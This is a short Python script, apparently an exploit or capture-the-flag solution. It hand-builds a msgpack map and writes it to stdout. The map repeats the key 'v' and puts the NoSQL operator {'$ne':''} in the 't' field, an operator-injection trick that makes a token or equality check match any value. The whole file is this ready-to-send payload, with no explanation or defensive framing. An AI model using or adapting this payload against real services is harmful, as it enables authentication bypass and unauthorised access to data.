import sys
import msgpack
import time

output = b''
output += b'\x84'
output += msgpack.packb("v")
output += msgpack.packb("N-00-005")
output += msgpack.packb("t")
output += msgpack.packb({"$ne":""})
output += msgpack.packb("d")
output += msgpack.packb(0)
output += msgpack.packb("v")
output += msgpack.packb("AAAAAAA")

sys.stdout.buffer.write(output)
